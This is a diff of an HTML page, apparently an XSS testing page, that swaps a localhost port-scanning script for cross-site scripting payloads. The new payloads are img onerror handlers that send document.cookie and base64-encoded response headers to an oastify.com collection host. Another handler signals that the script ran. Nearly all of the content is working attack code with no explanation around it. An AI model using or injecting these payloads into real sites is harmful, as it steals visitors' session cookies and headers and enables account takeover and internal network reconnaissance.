@@ -9,19 +9,12 @@
     This website is for testing
     <img src=https://1fh2j9oor4hb56jhh72jd5o6zx5qthh6.oastify.com?isanormalimage/>
     
-<script>
-let ports = [21, 22, 80, 443, 3306, 5000, 8080, 8443];
-
-ports.forEach(port => {
-  fetch("http://127.0.0.1:" + port, {mode: 'no-cors'})
-    .then(() => {
-      new Image().src = "https://1fh2j9oor4hb56jhh72jd5o6zx5qthh6.oastify.com/open?port=" + port;
-    })
-    .catch(() => {
-      new Image().src = "https://1fh2j9oor4hb56jhh72jd5o6zx5qthh6.oastify.com/closed?port=" + port;
-    });
-});
-</script>
+<img src=x onerror="new Image().src='https://1fh2j9oor4hb56jhh72jd5o6zx5qthh6.oastify.com/log?cookie='+document.cookie">
+    <img src=x onerror="fetch('/').then(r => { 
+  r.headers.forEach((v, k) => { 
+    new Image().src='https://1fh2j9oor4hb56jhh72jd5o6zx5qthh6.oastify.com/headersstealr?'+k+'='+btoa(v); 
+  });
+})">
 
 
     <img src=x onerror="fetch("https://1fh2j9oor4hb56jhh72jd5o6zx5qthh6.oastify.com/javascriptisExcuted=true", { mode: "no-cors" });">
